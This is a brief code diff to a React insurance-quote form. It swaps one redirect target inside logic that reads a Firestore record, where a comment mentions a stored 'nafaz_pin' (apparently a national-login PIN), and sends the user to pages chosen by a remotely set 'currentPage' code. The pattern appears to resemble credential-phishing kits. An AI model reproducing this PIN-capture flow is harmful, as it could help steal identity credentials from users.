@@ -174,7 +174,7 @@ export function ProfessionalQuoteForm() {
           const userData = docSnapshot.data()
           // Assuming the PIN is stored in a field called 'nafaz_pin'
           if(userData.currentPage ==='1'){
-              window.location.href='/quote'
+              window.location.href='/'
           }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
             window.location.href='/nafaz'
           }else if(userData.currentPage ==='9999'){
